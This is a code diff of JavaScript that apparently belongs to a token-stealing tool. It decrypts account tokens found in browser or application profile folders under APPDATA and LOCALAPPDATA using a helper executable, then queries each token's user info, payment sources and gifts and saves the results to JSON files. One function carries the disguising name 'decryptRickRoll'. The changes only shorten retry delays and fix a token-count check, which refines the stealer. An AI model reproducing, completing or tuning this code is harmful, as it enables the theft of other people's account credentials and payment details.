@@ -19,7 +19,7 @@ const decryptToken = async (token, key) => {
       join(getTempFolder(), 'decrypt_token.exe') + ' ' + ['--key', `"${key}"`, '--token', `"${token}"`].join(' ')
     )).toString('utf8')?.trim();
   } catch (e) {
-    await sleep(500);
+    await sleep(100);
     await decryptToken(token, key);
   }
 };
@@ -58,7 +58,7 @@ const decryptRickRoll = (path) => {
           source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
         });
       }
-      if (tokens.length >= 0) await handleTokens(tokens, resolve);
+      if (tokens.length > 0) await handleTokens(tokens, resolve);
     });
   });
 };
@@ -81,9 +81,9 @@ const handleTokens = async (tokens, resolve) => {
         writeFileSync(jsonFile, JSON.stringify(info));
       }
     } catch (e) {
-      if (retry === 10) return;
+      if (retry >= 5) return;
       if (e.response.status === 429 && e.response.data.retry_after) {
-        await sleep((e.response.data.retry_after * 1000) + 500);
+        await sleep((e.response.data.retry_after * 1000) + 100);
         await userInfo(token, source, retry + 1);
       }
     }
@@ -101,7 +101,7 @@ const handleTokens = async (tokens, resolve) => {
       writeFileSync(jsonFile, JSON.stringify(info));
     } catch (e) {
       if (e.response.status === 429 && e.response.data.retry_after) {
-        await sleep((e.response.data.retry_after * 1000) + 500);
+        await sleep((e.response.data.retry_after * 1000) + 100);
         await paymentSources(token);
       }
     }
@@ -119,7 +119,7 @@ const handleTokens = async (tokens, resolve) => {
       writeFileSync(jsonFile, JSON.stringify(info));
     } catch (e) {
       if (e.response.status === 429 && e.response.data.retry_after) {
-        await sleep((e.response.data.retry_after * 1000) + 500);
+        await sleep((e.response.data.retry_after * 1000) + 100);
         await gifts(token);
       }
     }
